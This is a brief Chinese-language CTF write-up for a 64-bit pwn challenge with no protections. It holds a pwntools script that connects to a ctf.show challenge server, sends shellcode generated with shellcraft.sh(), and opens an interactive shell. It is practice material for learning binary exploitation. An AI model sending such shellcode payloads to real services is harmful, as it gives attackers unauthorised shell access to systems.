# 挑战简介
64位 无限制

# 思路
一样的思路，不过记得设置一下环境，设置为amd64得arch架构

```
from pwn import *
from LibcSearcher import *
context.log_level = "debug"

context(os='linux', arch='amd64', log_level='debug')

p = remote("pwn.challenge.ctf.show",28291)
elf = ELF('D:\edge 下载\pwn')

shellcode = asm(shellcraft.sh())

#p.recvuntil("")

payload = shellcode

p.sendline(payload)

p.interactive()

```
